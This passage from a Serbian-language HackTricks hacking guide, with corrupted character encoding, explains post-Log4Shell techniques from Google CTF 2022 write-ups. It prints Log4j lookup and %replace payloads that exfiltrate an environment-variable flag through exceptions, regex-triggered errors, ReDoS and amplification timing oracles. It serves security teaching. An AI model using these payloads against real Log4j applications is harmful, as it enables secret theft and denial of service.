* [**Try Hack Me Solar soba**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell Eksploatacija

U ovom [**CTF izveÅ¡taju**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) je dobro objaÅ¡njeno kako je potencijalno **moguÄ‡e** da se **zloupotrebe** neke funkcije **Log4J**.

[**Sigurnosna stranica**](https://logging.apache.org/log4j/2.x/security.html) Log4j-a ima nekoliko zanimljivih reÄenica:

> Od verzije 2.16.0 (za Java 8), **funkcija pretrage poruka je potpuno uklonjena**. **Pretrage u konfiguraciji i dalje rade**. Å taviÅ¡e, Log4j sada po defaultu onemoguÄ‡ava pristup JNDI-ju. JNDI pretrage u konfiguraciji sada treba eksplicitno omoguÄ‡iti.

> Od verzije 2.17.0, (i 2.12.3 i 2.3.1 za Java 7 i Java 6), **samo stringovi pretrage u konfiguraciji se rekurzivno proÅ¡iruju**; u bilo kojoj drugoj upotrebi, samo se najviÅ¡a pretraga reÅ¡ava, a sve ugnjeÅ¾dene pretrage se ne reÅ¡avaju.

To znaÄi da po defaultu moÅ¾ete **zaboraviti na koriÅ¡Ä‡enje bilo kog `jndi` eksploita**. Å taviÅ¡e, da biste izvrÅ¡ili **rekurzivne pretrage**, morate ih imati konfigurirane.

Na primer, u tom CTF-u ovo je bilo konfigurirano u datoteci log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

U [ovom CTF-u](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) napadaÄ je kontrolisao vrednost `${sys:cmd}` i trebao je da eksfiltrira zastavu iz promenljive okruÅ¾enja.\
Kao Å¡to je prikazano na ovoj stranici u [**prethodnim payload-ima**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), postoje razliÄiti naÄini za pristup promenljivim okruÅ¾enja, kao Å¡to je: **`${env:FLAG}`**. U ovom CTF-u to je bilo beskorisno, ali moÅ¾da neÄ‡e biti u drugim stvarnim scenarijima.

### Exfiltration in Exceptions

U CTF-u, **niste mogli pristupiti stderr** java aplikacije koristeÄ‡i log4J, ali Log4J **izuzeci se Å¡alju na stdout**, koji je bio odÅ¡tampan u python aplikaciji. To je znaÄilo da aktiviranjem izuzetka moÅ¾emo pristupiti sadrÅ¾aju. Izuzetak za eksfiltraciju zastave bio je: **`${java:${env:FLAG}}`.** Ovo funkcioniÅ¡e jer **`${java:CTF{blahblah}}`** ne postoji i izuzetak sa vrednoÅ¡Ä‡u zastave Ä‡e biti prikazan:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

Samo da napomenem, mogli ste takoÄ‘e da injektujete nove [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i aktivirate izuzetke koji Ä‡e biti zabeleÅ¾eni na `stdout`. Na primer:

![](<../../.gitbook/assets/image (683).png>)

Ovo nije bilo korisno za eksfiltraciju podataka unutar poruke o greÅ¡ci, jer pretraga nije reÅ¡ena pre konverzionog obrasca, ali bi moglo biti korisno za druge stvari kao Å¡to je detekcija.

### Conversion Patterns Regexes

MeÄ‘utim, moguÄ‡e je koristiti neke **conversion patterns koji podrÅ¾avaju regexes** za eksfiltraciju informacija iz pretrage koristeÄ‡i regexes i zloupotrebljavajuÄ‡i **binarno pretraÅ¾ivanje** ili **vremenski zasnovano** ponaÅ¡anje.

* **Binarno pretraÅ¾ivanje putem poruka o izuzecima**

Konverzioni obrazac **`%replace`** moÅ¾e se koristiti za **zamenu** **sadrÅ¾aja** iz **stringa** Äak i koristeÄ‡i **regexes**. FunkcioniÅ¡e ovako: `replace{pattern}{regex}{substitution}`\
ZloupotrebljavajuÄ‡i ovo ponaÅ¡anje mogli biste uÄiniti da zamena **pokrene izuzetak ako regex odgovara** bilo Äemu unutar stringa (i bez izuzetka ako nije pronaÄ‘eno) ovako:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Na osnovu vremena**

Kao Å¡to je pomenuto u prethodnom odeljku, **`%replace`** podrÅ¾ava **regex**. Tako je moguÄ‡e koristiti payload sa [**ReDoS stranice**](../regular-expression-denial-of-service-redos.md) da izazove **timeout** u sluÄaju da je zastavica pronaÄ‘ena.\
Na primer, payload poput `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` bi izazvao **timeout** u tom CTF-u.

U ovom [**izveÅ¡taju**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), umesto koriÅ¡Ä‡enja ReDoS napada, koriÅ¡Ä‡en je **amplifikacioni napad** da izazove vremensku razliku u odgovoru:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Ako zastavica poÄinje sa `flagGuess`, cela zastavica se zamenjuje sa 29 `#`-ova (koristio sam ovaj karakter jer verovatno neÄ‡e biti deo zastavice). **Svaki od rezultantnih 29 `#`-ova se zatim zamenjuje sa 54 `#`-ova**. Ovaj proces se ponavlja **6 puta**, Å¡to dovodi do ukupnog broja ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-ova!**
>
> Zamena toliko `#`-ova Ä‡e izazvati 10-sekundni timeout Flask aplikacije, Å¡to Ä‡e rezultirati slanjem HTTP status koda 500 korisniku. (Ako zastavica ne poÄinje sa `flagGuess`, dobiÄ‡emo status kod koji nije 500)

## Reference

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
